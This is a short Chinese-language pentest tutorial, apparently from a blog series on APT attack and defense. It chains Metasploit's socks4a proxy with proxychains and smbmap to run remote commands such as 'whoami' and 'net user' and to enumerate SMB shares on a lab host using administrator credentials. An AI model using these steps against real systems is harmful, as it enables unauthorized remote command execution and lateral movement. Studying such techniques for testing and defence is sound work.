专注APT攻击与防御
https://micropoor.blogspot.com/

Msf在配合其它框架攻击，可补充msf本身的不足以及强化攻击方式，优化攻击线路。本季将会把msf与Smbmap结合攻击。弥补msf文件搜索以及文件内容搜索的不足。

项目地址：https://github.com/ShawnDEvans/smbmap

* 支持传递哈希
* 文件上传/下载/删除
* 可枚举（可写共享，配合Metasploit）
* 远程命令执行
* 支持文件内容搜索
* 支持文件名匹配（可以自动下载）
* msf配合Smbmap攻击需要使用到sock4a模块

`msf auxiliary(server/socks4a) > show options`
![](media/f7b132114e46760984cd298213740f4d.jpg)


该模块socks4a加入job
` msf auxiliary(server/socks4a) > jobs`
![](media/c38221c680e3e078414ebb4cfe8ecb66.jpg)

配置proxychains，做结合攻击铺垫。
`root@John:/tmp# cat /etc/proxychains.conf`
![](media/9fb4144cb5b4c7825b4ad698f740f3f5.jpg)
![](media/33f8922e2c8e134f96f3ca546e96c420.jpg)

支持远程命令

`root@John:/tmp\# proxychains smbmap ‐u administrator ‐p 123456 ‐d wordk group ‐H 192.168.1.115 ‐x 'net user'`
![](media/0d745135d03f66c1ec9bc97c844730f5.jpg)
`root@John:/tmp# proxychains smbmap ‐u administrator ‐p 123456 ‐d wordk group ‐H 192.168.1.115 ‐x 'whoami'`
![](media/c7d86f93c68a049ada011d3067384b07.jpg)

枚举目标机共享
`root@John:/tmp# proxychains smbmap ‐u administrator ‐p 123456 ‐d wordk group ‐H 192.168.1.115 ‐d ABC`
![](media/e28af8ca88f58bb38cf7e10087ab35d6.jpg)

`root\@John:/tmp\# proxychains smbmap ‐u administrator ‐p 123456 ‐d wordk group ‐H 192.168.1.115 ‐x 'ipconfig'`
![](media/123a8b0a7824f57dd5a78f5861b8baea.jpg)

Smbmap支持IP段的共享枚举，当然Smbmap还有更多强大的功能等待探索。
